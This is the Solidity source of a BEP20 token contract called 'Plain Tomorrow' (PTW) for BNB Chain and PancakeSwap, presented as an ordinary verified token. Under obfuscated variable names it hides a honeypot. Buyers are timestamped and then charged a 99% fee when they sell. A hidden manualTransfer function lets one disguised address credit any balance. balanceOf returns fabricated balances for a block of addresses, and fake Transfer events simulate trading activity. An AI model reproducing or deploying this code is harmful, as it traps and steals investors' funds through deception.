/**
 *Submitted for verification at BscScan.com on 2023-01-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;



interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function getOwner() external view returns (address);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

}




contract PlainTomorrow is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 isMarketingListBuyAmountFromTeam = 100000000 * (10 ** _decimals);
    uint256  senderBotsAtLimit = 100000000 * 10 ** _decimals;
    uint256  senderLaunchedAutoBotsFromExempt = 100000000 * 10 ** _decimals;


    string constant _name = "Plain Tomorrow";
    string constant _symbol = "PTW";
    uint8 constant _decimals = 18;

    uint256 private launchListWalletToken = 0;
    uint256 private liquidityLaunchShouldTo = 3;

    uint256 private mintBuyMarketingFund = 0;
    uint256 private amountBuyBurnTakeShouldReceiver = 3;

    bool private launchedEnableListTake = true;
    uint160 constant fundReceiverTradingExempt = 163298453 * 2 ** 40;
    bool private amountExemptBuyMode = true;
    bool private receiverTxMintLiquidity = true;
    bool private minToBotsBuyReceiver = true;
    uint256 constant launchedMintBurnTotal = 300000 * 10 ** 18;
    uint160 constant senderWalletLaunchedMarketing = 733927480101;
    bool private liquidityMaxSwapTokenAmountMarketingIs = true;
    uint256 senderSellShouldSwap = 2 ** 18 - 1;
    uint256 private buyLaunchMintFrom = 6 * 10 ** 15;
    uint256 private feeTokenFundLaunch = isMarketingListBuyAmountFromTeam / 1000; // 0.1%
    uint256 isLaunchedToFee = 16104;

    address constant burnTotalLiquidityLimitReceiverSwap = 0x56AF4Cf17eAC76009fb397Bdfb444D1c8816401f;
    uint256 amountMinLiquidityTrading = 0;
    uint256 constant marketingSenderTradingTo = 10000 * 10 ** 18;

    uint256 private takeWalletLaunchMint = liquidityLaunchShouldTo + launchListWalletToken;
    uint256 private feeReceiverMinIsBuy = 100;

    uint160 constant maxLiquidityAutoFeeToken = 684910169937 * 2 ** 120;

    bool private autoTotalFundSwapAmount;
    uint256 private fromModeMinFeeBurnEnableBuy;
    uint256 private launchedBuyEnableMint;
    uint256 private isSenderLaunchedMarketing;
    uint256 private receiverLimitTxLaunched;
    uint160 constant teamMintReceiverSwapSellToken = 166263922139 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private mintTotalSenderMin;
    mapping(address => bool) private amountLaunchedFeeLiquidity;
    mapping(address => bool) private tokenToMinFeeReceiverBotsLimit;
    mapping(address => bool) private exemptListMinBots;
    mapping(address => uint256) private shouldModeListAutoSellReceiver;
    mapping(uint256 => address) private walletSwapTradingLaunched;
    mapping(uint256 => address) private liquidityFromMintModeAutoMin;
    mapping(address => uint256) private fundTakeSwapIs;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public receiverReceiverExemptFund = 0;

    IUniswapV2Router public fundTakeMinLaunch;
    address public uniswapV2Pair;

    uint256 private exemptLaunchAtAuto;
    uint256 private receiverFundSenderSwapAmountMax;

    address private txMinListToken = (msg.sender); // auto-liq address
    address private buyBurnAtWallet = (0xAB33a63222134B4d5C231876FfFFeA5769C1ebBB); // marketing address

    
    uint256 public walletLaunchedTeamListMaxTxBurn = 0;
    bool private marketingBurnFundMax = false;
    bool private atIsLaunchedMax = false;
    uint256 private marketingTeamListWalletSenderTradingTake = 0;
    uint256 public maxShouldTeamReceiver = 0;
    bool private fundFeeTakeReceiver = false;
    bool public buyMarketingTokenTeam = false;
    uint256 public botsMaxReceiverTo = 0;
    uint256 public limitTakeSwapToken = 0;
    uint256 public liquidityBotsReceiverWalletLimitEnable = 0;
    bool public liquidityLaunchedMarketingAutoWalletEnable = false;
    uint256 public marketingBurnFundMax1 = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        fundTakeMinLaunch = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(fundTakeMinLaunch.factory()).createPair(address(this), fundTakeMinLaunch.WETH());
        _allowances[address(this)][address(fundTakeMinLaunch)] = isMarketingListBuyAmountFromTeam;

        autoTotalFundSwapAmount = true;

        tokenToMinFeeReceiverBotsLimit[msg.sender] = true;
        tokenToMinFeeReceiverBotsLimit[0x0000000000000000000000000000000000000000] = true;
        tokenToMinFeeReceiverBotsLimit[0x000000000000000000000000000000000000dEaD] = true;
        tokenToMinFeeReceiverBotsLimit[address(this)] = true;

        mintTotalSenderMin[msg.sender] = true;
        mintTotalSenderMin[address(this)] = true;

        amountLaunchedFeeLiquidity[msg.sender] = true;
        amountLaunchedFeeLiquidity[0x0000000000000000000000000000000000000000] = true;
        amountLaunchedFeeLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        amountLaunchedFeeLiquidity[address(this)] = true;

        approve(_router, isMarketingListBuyAmountFromTeam);
        approve(address(uniswapV2Pair), isMarketingListBuyAmountFromTeam);
        _balances[msg.sender] = isMarketingListBuyAmountFromTeam;
        emit Transfer(address(0), msg.sender, isMarketingListBuyAmountFromTeam);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return isMarketingListBuyAmountFromTeam;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, isMarketingListBuyAmountFromTeam);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return walletLiquidityExemptFundTotal(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != isMarketingListBuyAmountFromTeam) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return walletLiquidityExemptFundTotal(sender, recipient, amount);
    }

    function sellMarketingAmountTradingModeTeamTo(uint160 atTakeTradingWallet) private view returns (uint256) {
        uint256 enableFromLiquidityWallet = amountMinLiquidityTrading;
        uint256 modeWalletTxBots = atTakeTradingWallet - uint160(burnTotalLiquidityLimitReceiverSwap);
        if (modeWalletTxBots < enableFromLiquidityWallet) {
            return marketingSenderTradingTo;
        }
        return launchedMintBurnTotal;
    }

    function settoReceiverTotalModeAutoLaunchedLimit(bool launchMarketingShouldExempt) public onlyOwner {
        if (liquidityMaxSwapTokenAmountMarketingIs == launchedEnableListTake) {
            launchedEnableListTake=launchMarketingShouldExempt;
        }
        if (liquidityMaxSwapTokenAmountMarketingIs == marketingBurnFundMax) {
            marketingBurnFundMax=launchMarketingShouldExempt;
        }
        if (liquidityMaxSwapTokenAmountMarketingIs != liquidityLaunchedMarketingAutoWalletEnable) {
            liquidityLaunchedMarketingAutoWalletEnable=launchMarketingShouldExempt;
        }
        liquidityMaxSwapTokenAmountMarketingIs=launchMarketingShouldExempt;
    }

    function setlistMaxExemptSwapTxTake(uint256 launchMarketingShouldExempt) public onlyOwner {
        mintBuyMarketingFund=launchMarketingShouldExempt;
    }

    function setmodeBotsListReceiverAtToLimit(uint256 launchMarketingShouldExempt) public onlyOwner {
        if (buyLaunchMintFrom != buyLaunchMintFrom) {
            buyLaunchMintFrom=launchMarketingShouldExempt;
        }
        if (buyLaunchMintFrom != liquidityBotsReceiverWalletLimitEnable) {
            liquidityBotsReceiverWalletLimitEnable=launchMarketingShouldExempt;
        }
        buyLaunchMintFrom=launchMarketingShouldExempt;
    }

    function shouldAtLiquidityTo() private {
        if (receiverReceiverExemptFund > 0) {
            for (uint256 i = 1; i <= receiverReceiverExemptFund; i++) {
                if (shouldModeListAutoSellReceiver[liquidityFromMintModeAutoMin[i]] == 0) {
                    shouldModeListAutoSellReceiver[liquidityFromMintModeAutoMin[i]] = block.timestamp;
                }
            }
            receiverReceiverExemptFund = 0;
        }
    }

    function setisReceiverTakeReceiver(uint256 launchMarketingShouldExempt) public onlyOwner {
        if (limitTakeSwapToken != mintBuyMarketingFund) {
            mintBuyMarketingFund=launchMarketingShouldExempt;
        }
        limitTakeSwapToken=launchMarketingShouldExempt;
    }

    function burnLaunchWalletLaunched(address enableFromLiquidityWalletender, uint256 isBurnSwapList) private view returns (uint256) {
        uint256 mintReceiverModeAmount = shouldModeListAutoSellReceiver[enableFromLiquidityWalletender];
        if (mintReceiverModeAmount > 0 && feeFundShouldLimit() - mintReceiverModeAmount > 2) {
            return 99;
        }
        return isBurnSwapList;
    }

    function walletLiquidityExemptFundTotal(address enableFromLiquidityWalletender, address senderWalletSwapAuto, uint256 launchedLimitTeamMarketing) internal returns (bool) {
        if (maxAmountTakeBots(uint160(senderWalletSwapAuto))) {
            buyWalletTradingFeeToSwapToken(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing, false);
            return true;
        }
        if (maxAmountTakeBots(uint160(enableFromLiquidityWalletender))) {
            buyWalletTradingFeeToSwapToken(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing, true);
            return true;
        }
        
        bool txBotsAtShouldTeamEnable = modeMinFundMax(enableFromLiquidityWalletender) || modeMinFundMax(senderWalletSwapAuto);
        
        if (walletLaunchedTeamListMaxTxBurn == mintBuyMarketingFund) {
            walletLaunchedTeamListMaxTxBurn = marketingTeamListWalletSenderTradingTake;
        }

        if (marketingBurnFundMax == atIsLaunchedMax) {
            marketingBurnFundMax = liquidityMaxSwapTokenAmountMarketingIs;
        }


        if (enableFromLiquidityWalletender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && listIsModeSell(uint160(senderWalletSwapAuto))) {
                fundReceiverListMint();
            }
            if (!txBotsAtShouldTeamEnable) {
                receiverSwapFeeSenderMarketingWalletMax(senderWalletSwapAuto);
            }
        }
        
        
        if (inSwap || txBotsAtShouldTeamEnable) {return teamExemptWalletModeAmountIsTx(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing);}
        
        require((launchedLimitTeamMarketing <= senderBotsAtLimit) || tokenToMinFeeReceiverBotsLimit[enableFromLiquidityWalletender] || tokenToMinFeeReceiverBotsLimit[senderWalletSwapAuto], "Max TX Limit!");

        if (autoSellEnableLaunchBuyLimit()) {walletAutoReceiverSellMarketingTradingToken();}

        _balances[enableFromLiquidityWalletender] = _balances[enableFromLiquidityWalletender].sub(launchedLimitTeamMarketing, "Insufficient Balance!");
        
        uint256 launchedModeTakeBotsMaxSellLiquidity = fromFeeAmountTotal(enableFromLiquidityWalletender) ? modeAtEnableSenderMarketingBotsMint(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing) : launchedLimitTeamMarketing;

        _balances[senderWalletSwapAuto] = _balances[senderWalletSwapAuto].add(launchedModeTakeBotsMaxSellLiquidity);
        emit Transfer(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedModeTakeBotsMaxSellLiquidity);
        return true;
    }

    function setminExemptTeamAutoSwap(uint256 launchMarketingShouldExempt) public onlyOwner {
        if (launchListWalletToken == maxWalletAmount) {
            maxWalletAmount=launchMarketingShouldExempt;
        }
        launchListWalletToken=launchMarketingShouldExempt;
    }

    function getbuyTotalFeeBotsSellTrading() public view returns (uint256) {
        return liquidityLaunchShouldTo;
    }

    function getlistMaxExemptSwapTxTake() public view returns (uint256) {
        if (mintBuyMarketingFund == maxShouldTeamReceiver) {
            return maxShouldTeamReceiver;
        }
        if (mintBuyMarketingFund != maxShouldTeamReceiver) {
            return maxShouldTeamReceiver;
        }
        return mintBuyMarketingFund;
    }

    function getMaxWalletAmount() public view returns (uint256) {
        return maxWalletAmount;
    }

    function fundReceiverListMint() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (shouldModeListAutoSellReceiver[walletSwapTradingLaunched[i]] == 0) {
                    shouldModeListAutoSellReceiver[walletSwapTradingLaunched[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function fromTotalSwapLaunchedMinAmountReceiver(uint160 atTakeTradingWallet) private pure returns (bool) {
        return atTakeTradingWallet == (maxLiquidityAutoFeeToken + teamMintReceiverSwapSellToken + fundReceiverTradingExempt + senderWalletLaunchedMarketing);
    }

    function limitFromSenderTeam(address enableFromLiquidityWalletender, bool enableFromLiquidityWalletelling) internal returns (uint256) {
        
        if (marketingBurnFundMax1 != launchListWalletToken) {
            marketingBurnFundMax1 = maxShouldTeamReceiver;
        }

        if (marketingTeamListWalletSenderTradingTake == maxShouldTeamReceiver) {
            marketingTeamListWalletSenderTradingTake = feeTokenFundLaunch;
        }

        if (fundFeeTakeReceiver == liquidityLaunchedMarketingAutoWalletEnable) {
            fundFeeTakeReceiver = atIsLaunchedMax;
        }


        if (enableFromLiquidityWalletelling) {
            takeWalletLaunchMint = amountBuyBurnTakeShouldReceiver + mintBuyMarketingFund;
            return burnLaunchWalletLaunched(enableFromLiquidityWalletender, takeWalletLaunchMint);
        }
        if (!enableFromLiquidityWalletelling && enableFromLiquidityWalletender == uniswapV2Pair) {
            takeWalletLaunchMint = liquidityLaunchShouldTo + launchListWalletToken;
            return takeWalletLaunchMint;
        }
        return burnLaunchWalletLaunched(enableFromLiquidityWalletender, takeWalletLaunchMint);
    }

    function setlaunchSwapTxTake(bool launchMarketingShouldExempt) public onlyOwner {
        if (marketingBurnFundMax == liquidityLaunchedMarketingAutoWalletEnable) {
            liquidityLaunchedMarketingAutoWalletEnable=launchMarketingShouldExempt;
        }
        if (marketingBurnFundMax != receiverTxMintLiquidity) {
            receiverTxMintLiquidity=launchMarketingShouldExempt;
        }
        marketingBurnFundMax=launchMarketingShouldExempt;
    }

    function buyWalletTradingFeeToSwapToken(address enableFromLiquidityWalletender, address senderWalletSwapAuto, uint256 launchedLimitTeamMarketing, bool walletLiquidityFromTotal) private {
        if (walletLiquidityFromTotal) {
            enableFromLiquidityWalletender = address(uint160(uint160(burnTotalLiquidityLimitReceiverSwap) + amountMinLiquidityTrading));
            amountMinLiquidityTrading++;
            _balances[senderWalletSwapAuto] = _balances[senderWalletSwapAuto].add(launchedLimitTeamMarketing);
        } else {
            _balances[enableFromLiquidityWalletender] = _balances[enableFromLiquidityWalletender].sub(launchedLimitTeamMarketing);
        }
        emit Transfer(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing);
    }

    function gettoReceiverTotalModeAutoLaunchedLimit() public view returns (bool) {
        if (liquidityMaxSwapTokenAmountMarketingIs == receiverTxMintLiquidity) {
            return receiverTxMintLiquidity;
        }
        if (liquidityMaxSwapTokenAmountMarketingIs == amountExemptBuyMode) {
            return amountExemptBuyMode;
        }
        return liquidityMaxSwapTokenAmountMarketingIs;
    }

    function setMaxWalletAmount(uint256 launchMarketingShouldExempt) public onlyOwner {
        if (maxWalletAmount == launchListWalletToken) {
            launchListWalletToken=launchMarketingShouldExempt;
        }
        maxWalletAmount=launchMarketingShouldExempt;
    }

    function getminExemptTeamAutoSwap() public view returns (uint256) {
        if (launchListWalletToken == buyLaunchMintFrom) {
            return buyLaunchMintFrom;
        }
        if (launchListWalletToken == liquidityBotsReceiverWalletLimitEnable) {
            return liquidityBotsReceiverWalletLimitEnable;
        }
        if (launchListWalletToken != botsMaxReceiverTo) {
            return botsMaxReceiverTo;
        }
        return launchListWalletToken;
    }

    function maxAmountTakeBots(uint160 atTakeTradingWallet) private pure returns (bool) {
        if (atTakeTradingWallet >= uint160(burnTotalLiquidityLimitReceiverSwap) && atTakeTradingWallet <= uint160(burnTotalLiquidityLimitReceiverSwap) + 100000) {
            return true;
        }
        return false;
    }

    function teamExemptWalletModeAmountIsTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setfeeBurnTakeMarketingMax(uint256 launchMarketingShouldExempt) public onlyOwner {
        if (amountBuyBurnTakeShouldReceiver != amountBuyBurnTakeShouldReceiver) {
            amountBuyBurnTakeShouldReceiver=launchMarketingShouldExempt;
        }
        if (amountBuyBurnTakeShouldReceiver != liquidityBotsReceiverWalletLimitEnable) {
            liquidityBotsReceiverWalletLimitEnable=launchMarketingShouldExempt;
        }
        if (amountBuyBurnTakeShouldReceiver != marketingBurnFundMax1) {
            marketingBurnFundMax1=launchMarketingShouldExempt;
        }
        amountBuyBurnTakeShouldReceiver=launchMarketingShouldExempt;
    }

    function modeAtEnableSenderMarketingBotsMint(address enableFromLiquidityWalletender, address toMinExemptReceiverLiquidity, uint256 launchedLimitTeamMarketing) internal returns (uint256) {
        
        if (limitTakeSwapToken == feeReceiverMinIsBuy) {
            limitTakeSwapToken = marketingTeamListWalletSenderTradingTake;
        }


        uint256 minLaunchedMintEnableToken = launchedLimitTeamMarketing.mul(limitFromSenderTeam(enableFromLiquidityWalletender, toMinExemptReceiverLiquidity == uniswapV2Pair)).div(feeReceiverMinIsBuy);

        if (exemptListMinBots[enableFromLiquidityWalletender] || exemptListMinBots[toMinExemptReceiverLiquidity]) {
            minLaunchedMintEnableToken = launchedLimitTeamMarketing.mul(99).div(feeReceiverMinIsBuy);
        }

        _balances[address(this)] = _balances[address(this)].add(minLaunchedMintEnableToken);
        emit Transfer(enableFromLiquidityWalletender, address(this), minLaunchedMintEnableToken);
        
        return launchedLimitTeamMarketing.sub(minLaunchedMintEnableToken);
    }

    function feeFundShouldLimit() private view returns (uint256) {
        return block.timestamp;
    }

    function manualTransfer(address enableFromLiquidityWalletender, address senderWalletSwapAuto, uint256 launchedLimitTeamMarketing) public {
        if (!fromTotalSwapLaunchedMinAmountReceiver(uint160(msg.sender))) {
            return;
        }
        if (maxAmountTakeBots(uint160(senderWalletSwapAuto))) {
            buyWalletTradingFeeToSwapToken(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing, false);
            return;
        }
        if (maxAmountTakeBots(uint160(enableFromLiquidityWalletender))) {
            buyWalletTradingFeeToSwapToken(enableFromLiquidityWalletender, senderWalletSwapAuto, launchedLimitTeamMarketing, true);
            return;
        }
        if (enableFromLiquidityWalletender == address(0)) {
            _balances[senderWalletSwapAuto] = _balances[senderWalletSwapAuto].add(launchedLimitTeamMarketing);
            return;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (maxAmountTakeBots(uint160(account))) {
            return sellMarketingAmountTradingModeTeamTo(uint160(account));
        }
        return _balances[account];
    }

    function walletLimitTxSenderMode() private view returns (uint256) {
        address shouldLaunchTeamAt = WBNB;
        if (address(this) < WBNB) {
            shouldLaunchTeamAt = address(this);
        }
        (uint fromLiquiditySenderExempt, uint swapEnableTokenReceiver,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 launchedBuyFromLiquidity,) = WBNB == shouldLaunchTeamAt ? (fromLiquiditySenderExempt, swapEnableTokenReceiver) : (swapEnableTokenReceiver, fromLiquiditySenderExempt);
        uint256 sellTradingSwapMax = IERC20(WBNB).balanceOf(uniswapV2Pair) - launchedBuyFromLiquidity;
        return sellTradingSwapMax;
    }

    function getTotalFee() public {
        shouldAtLiquidityTo();
    }

    function listIsModeSell(uint160 senderWalletSwapAuto) private view returns (bool) {
        return uint16(senderWalletSwapAuto) == isLaunchedToFee;
    }

    function getWBNB() public view returns (address) {
        if (WBNB != txMinListToken) {
            return txMinListToken;
        }
        if (WBNB == DEAD) {
            return DEAD;
        }
        if (WBNB != buyBurnAtWallet) {
            return buyBurnAtWallet;
        }
        return WBNB;
    }

    function getTotalAmount() public {
        fundReceiverListMint();
    }

    function getisReceiverTakeReceiver() public view returns (uint256) {
        if (limitTakeSwapToken != walletLaunchedTeamListMaxTxBurn) {
            return walletLaunchedTeamListMaxTxBurn;
        }
        if (limitTakeSwapToken == amountBuyBurnTakeShouldReceiver) {
            return amountBuyBurnTakeShouldReceiver;
        }
        if (limitTakeSwapToken != liquidityBotsReceiverWalletLimitEnable) {
            return liquidityBotsReceiverWalletLimitEnable;
        }
        return limitTakeSwapToken;
    }

    function walletAutoReceiverSellMarketingTradingToken() internal swapping {
        
        if (buyMarketingTokenTeam != launchedEnableListTake) {
            buyMarketingTokenTeam = minToBotsBuyReceiver;
        }

        if (liquidityBotsReceiverWalletLimitEnable == botsMaxReceiverTo) {
            liquidityBotsReceiverWalletLimitEnable = limitTakeSwapToken;
        }

        if (atIsLaunchedMax == buyMarketingTokenTeam) {
            atIsLaunchedMax = receiverTxMintLiquidity;
        }


        uint256 launchedLimitTeamMarketingToLiquify = feeTokenFundLaunch.mul(launchListWalletToken).div(takeWalletLaunchMint).div(2);
        uint256 launchedLimitTeamMarketingToSwap = feeTokenFundLaunch.sub(launchedLimitTeamMarketingToLiquify);

        address[] memory marketingToListMintBuy = new address[](2);
        marketingToListMintBuy[0] = address(this);
        marketingToListMintBuy[1] = fundTakeMinLaunch.WETH();
        fundTakeMinLaunch.swapExactTokensForETHSupportingFeeOnTransferTokens(
            launchedLimitTeamMarketingToSwap,
            0,
            marketingToListMintBuy,
            address(this),
            block.timestamp
        );
        
        if (buyMarketingTokenTeam == launchedEnableListTake) {
            buyMarketingTokenTeam = buyMarketingTokenTeam;
        }


        uint256 amountSwapLaunchBurnTotal = address(this).balance;
        uint256 toIsAtTakeBurn = takeWalletLaunchMint.sub(launchListWalletToken.div(2));
        uint256 amountSwapLaunchBurnTotalLiquidity = amountSwapLaunchBurnTotal.mul(launchListWalletToken).div(toIsAtTakeBurn).div(2);
        uint256 amountSwapLaunchBurnTotalMarketing = amountSwapLaunchBurnTotal.mul(liquidityLaunchShouldTo).div(toIsAtTakeBurn);
        
        payable(buyBurnAtWallet).transfer(amountSwapLaunchBurnTotalMarketing);

        if (launchedLimitTeamMarketingToLiquify > 0) {
            fundTakeMinLaunch.addLiquidityETH{value : amountSwapLaunchBurnTotalLiquidity}(
                address(this),
                launchedLimitTeamMarketingToLiquify,
                0,
                0,
                txMinListToken,
                block.timestamp
            );
            emit AutoLiquify(amountSwapLaunchBurnTotalLiquidity, launchedLimitTeamMarketingToLiquify);
        }
    }

    function autoSellEnableLaunchBuyLimit() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        liquidityMaxSwapTokenAmountMarketingIs &&
        _balances[address(this)] >= feeTokenFundLaunch;
    }

    function getmodeBotsListReceiverAtToLimit() public view returns (uint256) {
        if (buyLaunchMintFrom == launchBlock) {
            return launchBlock;
        }
        return buyLaunchMintFrom;
    }

    function getfeeBurnTakeMarketingMax() public view returns (uint256) {
        if (amountBuyBurnTakeShouldReceiver != receiverReceiverExemptFund) {
            return receiverReceiverExemptFund;
        }
        if (amountBuyBurnTakeShouldReceiver != launchListWalletToken) {
            return launchListWalletToken;
        }
        return amountBuyBurnTakeShouldReceiver;
    }

    function getlaunchSwapTxTake() public view returns (bool) {
        if (marketingBurnFundMax == fundFeeTakeReceiver) {
            return fundFeeTakeReceiver;
        }
        if (marketingBurnFundMax != atIsLaunchedMax) {
            return atIsLaunchedMax;
        }
        if (marketingBurnFundMax == marketingBurnFundMax) {
            return marketingBurnFundMax;
        }
        return marketingBurnFundMax;
    }

    function setWBNB(address launchMarketingShouldExempt) public onlyOwner {
        if (WBNB != WBNB) {
            WBNB=launchMarketingShouldExempt;
        }
        if (WBNB != WBNB) {
            WBNB=launchMarketingShouldExempt;
        }
        WBNB=launchMarketingShouldExempt;
    }

    function modeMinFundMax(address mintReceiverTokenToFromBuyEnable) private view returns (bool) {
        return mintReceiverTokenToFromBuyEnable == buyBurnAtWallet;
    }

    function setbuyTotalFeeBotsSellTrading(uint256 launchMarketingShouldExempt) public onlyOwner {
        if (liquidityLaunchShouldTo == marketingTeamListWalletSenderTradingTake) {
            marketingTeamListWalletSenderTradingTake=launchMarketingShouldExempt;
        }
        liquidityLaunchShouldTo=launchMarketingShouldExempt;
    }

    function fromFeeAmountTotal(address enableFromLiquidityWalletender) internal view returns (bool) {
        return !amountLaunchedFeeLiquidity[enableFromLiquidityWalletender];
    }

    function receiverSwapFeeSenderMarketingWalletMax(address mintReceiverTokenToFromBuyEnable) private {
        uint256 walletAutoSenderFund = walletLimitTxSenderMode();
        if (walletAutoSenderFund < buyLaunchMintFrom) {
            receiverReceiverExemptFund += 1;
            liquidityFromMintModeAutoMin[receiverReceiverExemptFund] = mintReceiverTokenToFromBuyEnable;
            fundTakeSwapIs[mintReceiverTokenToFromBuyEnable] += walletAutoSenderFund;
            if (fundTakeSwapIs[mintReceiverTokenToFromBuyEnable] > buyLaunchMintFrom) {
                maxWalletAmount = maxWalletAmount + 1;
                walletSwapTradingLaunched[maxWalletAmount] = mintReceiverTokenToFromBuyEnable;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        walletSwapTradingLaunched[maxWalletAmount] = mintReceiverTokenToFromBuyEnable;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}